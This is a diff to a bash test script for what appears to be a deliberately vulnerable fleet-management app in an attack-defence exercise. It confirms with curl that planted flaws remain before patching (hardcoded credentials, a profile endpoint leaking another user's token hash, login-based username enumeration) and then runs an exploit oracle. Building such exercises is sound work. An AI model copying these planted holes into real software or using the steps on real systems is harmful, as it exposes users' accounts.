@@ -35,10 +35,45 @@ for i in $(seq 1 45); do
   sleep 4
 done
 
+echo "[test] Verifying intended unpatched exploit chain for S7..."
+DISPATCHER_COOKIE_JAR="$(mktemp)"
+trap 'rm -f "$DISPATCHER_COOKIE_JAR"' EXIT
+
+RESP=$(curl -sf -c "$DISPATCHER_COOKIE_JAR" -X POST "$BASE_URL/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"dispatcher","password":"dispatch456"}')
+echo "$RESP" | grep -q 'Login successful' || { echo "[FAIL] dispatcher foothold missing"; exit 1; }
+
+DRIVER_COOKIE_JAR="$(mktemp)"
+trap 'rm -f "$DISPATCHER_COOKIE_JAR" "$DRIVER_COOKIE_JAR"' EXIT
+RESP=$(curl -sf -c "$DRIVER_COOKIE_JAR" -X POST "$BASE_URL/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"driver","password":"fleet123"}')
+echo "$RESP" | grep -q 'Login successful' || { echo "[FAIL] driver SLA login missing"; exit 1; }
+
+STATUS=$(curl -s -o /tmp/s7-driver-vault.out -w "%{http_code}" -b "$DRIVER_COOKIE_JAR" \
+  "$BASE_URL/profile/vault")
+[ "$STATUS" = "403" ] || { echo "[FAIL] SLA driver account should not directly reach flag_3"; exit 1; }
+
+PROFILE=$(curl -sf -b "$DISPATCHER_COOKIE_JAR" "$BASE_URL/profile/token?username=vaultdriver")
+echo "$PROFILE" | grep -q '"legacy_token"' || { echo "[FAIL] dispatcher cannot leak driver hash"; exit 1; }
+
+STATUS=$(curl -s -o /tmp/s7-search.out -w "%{http_code}" \
+  "$BASE_URL/vehicles/search?q=test")
+[ "$STATUS" = "401" ] || { echo "[FAIL] vehicle search should require authentication"; exit 1; }
+
+LOGIN_UNKNOWN=$(curl -s -o - -w "\n%{http_code}" -X POST "$BASE_URL/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"opsbot","password":"wrong"}')
+LOGIN_VALID=$(curl -s -o - -w "\n%{http_code}" -X POST "$BASE_URL/login" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"telemetry","password":"wrong"}')
+[ "$LOGIN_UNKNOWN" != "$LOGIN_VALID" ] || { echo "[FAIL] login should still permit username enumeration pre-patch"; exit 1; }
+
 echo "[test] === Phase 1: unpatched — expecting 5/5 ==="
 OUTPUT=$(python3 "$ORACLE" \
   --target-host "${TARGET_HOST:-localhost}" \
-  --target-port 3000 \
+  --target-port "${TARGET_PORT:-3000}" \
   --referee-url "$REFEREE_URL" \
   --match-id "$MATCH_ID" \
   --attacker-id 0 \
@@ -70,7 +105,7 @@ done
 echo "[test] === Phase 2: patched — expecting 0/5 ==="
 OUTPUT=$(python3 "$ORACLE" \
   --target-host "${TARGET_HOST:-localhost}" \
-  --target-port 3000 \
+  --target-port "${TARGET_PORT:-3000}" \
   --referee-url "$REFEREE_URL" \
   --match-id "$MATCH_ID" \
   --attacker-id 0 \
@@ -92,11 +127,11 @@ STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/debug/env")
 [ "$STATUS" != "200" ] || { echo "[FAIL] /debug/env still returns 200 after patch"; exit 1; }
 echo "[PASS] /debug/env returns $STATUS (not 200)."
 
-echo "[test] Verifying patched driver login works with rotated password..."
+echo "[test] Verifying patched SLA driver login still works..."
 RESP=$(curl -sf -X POST "$BASE_URL/login" \
   -H "Content-Type: application/json" \
-  -d '{"username":"driver","password":"S7Driver-9kZ8-Route!"}' || echo "failed")
-echo "$RESP" | grep -q "Login successful" || { echo "[FAIL] Patched driver login failed"; exit 1; }
-echo "[PASS] Patched driver can login with rotated password."
+  -d '{"username":"driver","password":"fleet123"}' || echo "failed")
+echo "$RESP" | grep -q "Login successful" || { echo "[FAIL] Patched driver SLA login failed"; exit 1; }
+echo "[PASS] Patched driver SLA login still works."
 
 echo "[PASS] All tests passed."
